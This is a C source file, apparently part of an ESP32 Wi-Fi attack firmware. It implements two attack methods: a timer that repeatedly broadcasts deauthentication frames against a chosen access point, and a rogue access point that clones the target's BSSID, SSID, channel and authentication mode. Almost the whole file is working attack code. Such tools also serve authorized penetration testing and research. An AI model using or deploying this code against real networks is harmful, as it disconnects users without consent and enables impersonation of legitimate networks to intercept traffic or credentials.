#include "Attack/attack_method.h"

#include <string.h>

#include "esp_log.h"
#include "esp_err.h"

#include "AttackLog/log.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "WifiController/wifi_controller.h"
#include "WslBypasser/wsl_bypasser.h"

static const char *TAG = "attack_method";
static esp_timer_handle_t deauth_timer_handle;

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodicaly called to send deauthentication frame for given AP
 * 
 * @param arg expects wifi_ap_record_t
 */
static void timer_send_deauth_frame(void *arg){
    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec){
    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record,
        .dispatch_method = ESP_TIMER_TASK,
        .name = "deauth_timer"
    };
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop(){
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ATTACK_LOG_D(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    
    // Manual copy for strings in C++
    wifi_config_t ap_config = {
        .ap = {
             // .ssid set later
             // .password set later
            .ssid_len = (uint8_t)strlen((char*)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .max_connection = 1,
        },
    };
    strncpy((char*)ap_config.ap.password, "dummypassword", 64);
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    
    wifictl_ap_start(&ap_config);
}
